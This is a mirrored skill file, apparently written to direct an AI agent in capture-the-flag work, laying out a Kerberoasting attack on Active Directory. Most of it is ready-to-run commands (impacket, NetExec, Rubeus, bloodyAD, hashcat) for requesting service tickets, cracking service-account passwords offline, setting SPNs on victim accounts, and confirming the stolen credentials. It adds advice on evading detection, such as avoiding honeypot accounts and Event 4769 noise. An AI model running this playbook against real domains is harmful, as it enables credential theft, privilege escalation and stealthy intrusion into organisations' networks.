# Kerberoasting

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/active-directory/kerberoasting.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/active-directory/kerberoasting.md)

---

---
name: kerberoasting
category: active-directory
triggers: ["kerberoast", "kerberoasting", "GetUserSPNs", "SPN", "servicePrincipalName", "TGS-REP", "hashcat 13100", "krb5tgs", "Rubeus kerberoast", "targeted kerberoast"]
tools: ["impacket-GetUserSPNs", "netexec/nxc", "Rubeus", "hashcat", "john"]
priority: high
description: Request TGS tickets for SPN-bearing accounts and crack them offline to recover service-account plaintext passwords.
---
# Kerberoasting

## Trigger context
You hold any valid domain credential (even a low-priv user) and want to escalate by cracking a service account. Any authenticated user can request a TGS for any account with a `servicePrincipalName`; the ticket is encrypted with the service account's key, so it can be cracked offline. High value because service accounts are frequently over-privileged and have weak, rarely-rotated passwords.

## Objective
Enumerate accounts with SPNs, request their TGS-REP tickets, and crack them offline (hashcat mode 13100) to recover plaintext service-account credentials.

## Methodology (decision tree)
```
Have valid domain creds (pw / hash / ticket)?
├── YES → GetUserSPNs -request → collect TGS hashes → hashcat -m 13100
│         ├── Cracked?  → new creds → re-run BloodHound as that account
│         └── AES-only? → slower; still crack, or force RC4 if downgrade possible
└── NO  → do you have GenericWrite/GenericAll over a target user? (BloodHound)
          └── YES → "Targeted Kerberoasting": set an SPN on the victim → roast → remove SPN
          └── NO  → no preauth account? try AS-REP roasting instead (asreproasting.md)
```

## Commands & payloads
```bash
# --- Enumerate SPN accounts only (no ticket request) ---
impacket-GetUserSPNs corp.local/jdoe:'Passw0rd!' -dc-ip DC_IP

# --- Request tickets and save hashcat-format hashes ---
impacket-GetUserSPNs -request -dc-ip DC_IP -outputfile kerb.hashes corp.local/jdoe:'Passw0rd!'

# --- With NT hash (pass-the-hash) or Kerberos ticket ---
impacket-GetUserSPNs -request -hashes :NTHASH -dc-ip DC_IP corp.local/jdoe -outputfile kerb.hashes
KRB5CCNAME=jdoe.ccache impacket-GetUserSPNs -k -no-pass -dc-ip DC_IP corp.local/jdoe -request

# --- Request one specific account (quieter) ---
impacket-GetUserSPNs -request-user svc_sql -dc-ip DC_IP corp.local/jdoe:'Passw0rd!' -outputfile sql.hash

# --- No pre-auth roasting (only user list, no creds; needs a target user w/o preauth) ---
impacket-GetUserSPNs -no-preauth targetuser -usersfile users.txt -dc-host dc.corp.local corp.local/

# --- NetExec module (writes hashes to file) ---
nxc ldap DC_IP -u jdoe -p 'Passw0rd!' --kerberoasting kerb.hashes

# --- Crack (RC4-HMAC / etype 23) ---
hashcat -m 13100 -a 0 kerb.hashes /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.hashes rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# AES256 TGS (etype 18) uses hashcat mode 19700; AES128 (etype 17) = 19600
john --format=krb5tgs --wordlist=rockyou.txt kerb.hashes
```

Windows equivalents:
```powershell
# Rubeus (on a domain-joined / runas host)
Rubeus.exe kerberoast /outfile:kerb.hashes
Rubeus.exe kerberoast /user:svc_sql /outfile:sql.hash
Rubeus.exe kerberoast /rc4opsec        # only roast RC4-supported accounts (evade AES honeypots)
Rubeus.exe kerberoast /tgtdeleg        # request without touching preauth (stealth)
# PowerView SPN discovery
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
```

Targeted kerberoasting (you have write over a victim user):
```bash
# Set an SPN, roast, then clean up
targetedKerberoast.py -v -d corp.local -u jdoe -p 'Passw0rd!'    # ShutdownRepo tool, automates set+roast+restore
# or manually with bloodyAD / PowerView:
bloodyAD -d corp.local -u jdoe -p 'Passw0rd!' --host DC_IP set object victimuser servicePrincipalName -v "fake/svc"
# ... impacket-GetUserSPNs -request-user victimuser ...
bloodyAD -d corp.local -u jdoe -p 'Passw0rd!' --host DC_IP set object victimuser servicePrincipalName   # clear
```

Hash format reference (identify before choosing the mode):
```
$krb5tgs$23$*user$REALM$spn*$...   → etype 23 RC4-HMAC   → hashcat -m 13100
$krb5tgs$17$...                    → etype 17 AES128     → hashcat -m 19600
$krb5tgs$18$...                    → etype 18 AES256     → hashcat -m 19700
```

## Branching logic
- Ticket etype 23 (RC4, `$krb5tgs$23$`) -> mode 13100, fast to crack.
- Ticket etype 17/18 (AES) -> mode 19600/19700, much slower; prioritize RC4 targets first.
- Cracked a service account -> treat as new owned principal; re-run BloodHound and check for local admin / delegation.
- `krbtgt` itself has an SPN but is uncrackable in practice — ignore it, it's the golden-ticket key not a roast target.
- No SPN accounts but you have write over a user -> targeted kerberoasting.

OPSEC / detection notes:
- Each request generates DC Event 4769 (TGS requested); RC4-requested tickets for user accounts are a classic detection signal.
- Rubeus `/tgtdeleg` and `/rc4opsec` reduce noise by avoiding forced downgrades and honeypot (fake-SPN) accounts.
- Prefer targeting a single high-value account (`-request-user`) over dumping every SPN.

## Common pitfalls
- Clock skew -> `KRB_AP_ERR_SKEW`; sync time to the DC (`ntpdate`/`faketime`) before requesting.
- Requesting all SPNs is noisy (Event 4769 flood); prefer `-request-user` for one high-value target.
- `machine$` accounts have SPNs but 120-char random passwords — never crackable; skip computer accounts.
- If accounts only support AES, do not assume "safe" — still attempt; also consider Rubeus `/tgtdeleg` to avoid downgrade detection.
- Output file must be hashcat format; impacket defaults to hashcat, but verify the `$krb5tgs$` prefix.

## Proof / verification
- Cracked hash yields plaintext: `hashcat -m 13100 kerb.hashes --show`.
- Validate the recovered password: `nxc smb DC_IP -u svc_sql -p 'CrackedPass'` (look for `[+]` / `(Pwn3d!)`).

## Cross-references
- [sa--instructions--active-directory--ad-enum-bloodhound.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--ad-enum-bloodhound.md) — find SPN accounts and confirm privileges of cracked account.
- [sa--instructions--active-directory--asreproasting.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--asreproasting.md) — the no-preauth sibling attack when no creds/SPNs.
- [sa--instructions--active-directory--dcsync-dump.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--dcsync-dump.md) — if the cracked account has replication rights.
- [sa--instructions--active-directory--pth-ptt-lateral.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--pth-ptt-lateral.md) — reuse the recovered password/hash to move laterally.

## Credible sources
- https://www.thehacker.recipes/ad/movement/kerberos/kerberoast
- https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html
- https://www.netexec.wiki/ldap-protocol/kerberoasting
- https://hashcat.net/wiki/doku.php?id=example_hashes
- https://github.com/GhostPack/Rubeus#kerberoast
